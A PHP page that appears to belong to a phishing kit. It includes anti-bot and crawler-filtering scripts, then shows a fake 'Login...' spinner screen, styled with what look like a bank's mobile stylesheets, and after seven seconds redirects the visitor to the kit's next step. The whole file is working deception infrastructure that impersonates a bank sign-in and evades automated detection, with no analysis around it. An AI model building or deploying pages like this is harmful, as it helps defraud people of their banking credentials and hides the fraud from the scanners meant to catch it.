<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
echo '<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<script>setTimeout(function(){window.location.href="com/ot?authin";}, 7000);</script>

<title> Login... </title>
<link rel="shortcut icon" href="bstyles/favicon.ico?ts=20151018" type="image/x-icon">
<link rel="stylesheet" href="bstyles/bactouch.css"><link rel="stylesheet" href="bstyles/toolbar.css"><link rel="stylesheet" href="bstyles/bact_listview.css"><link rel="stylesheet" href="bstyles/footer.css"><link rel="stylesheet" href="bstyles/slidemenu.css">

<style>
	html,body{height:100%;width:100%;padding:0;margin:0;background-color:#f9f7f4;position:relative;box-sizing:border-box;
background: #f9f7f4;
    background: -moz-linear-gradient(top,#f9f7f4 0,#2e6ea3 100%);
    -ms-filter: alpha(opacity=90);
    filter: alpha(opacity=90);}
   
    .contt-rot{
        width: auto;
        height:100%;
        margin: auto;position:relative;background-color:#f9f7f4;z-index:900;
background: #f9f7f4;
    background: -moz-linear-gradient(top,#f9f7f4 0,#2e6ea3 100%);
    -ms-filter: alpha(opacity=90);
    filter: alpha(opacity=90);
    }
    .content{
		width:80%;
        max-width: 300px;
		text-align:center;
        margin: auto;position:relative;
		top:26%;
    }
    .layout{
        text-align: center;
        margin: 65px 0 20px;
    }
    .layout h3{
		color:#fff;
        margin-bottom: 40px;
        font-size: 18px;
    }
    .jpuimg_rotate{
        display: inline-block;box-sizing:border-box;
        margin: auto auto;
        height:28px;
        width:28px;
        -webkit-animation: rotation .7s infinite linear;
        -moz-animation: rotation .7s infinite linear;
        -o-animation: rotation .7s infinite linear;
        animation: rotation .7s infinite linear;
        border-left:4px solid #ccc;
        border-right:4px solid #d9003b;
        border-bottom:4px solid #d9003b;
        border-top:4px solid #d9003b;
        border-radius:100%;
    }
    @keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }
	form{position:absolute;z-index:0;top:0}
</style>
</head>
<body>
<div class="contt-rot">
    <div class="content">
        <div class="layout">
            <h3>&nbsp;</h3>
            <div class="jpuimg_rotate"></div>
        </div>
		Loggin you in.....
    </div>
</div>
	<footer></footer>
</body>
</html>';
?>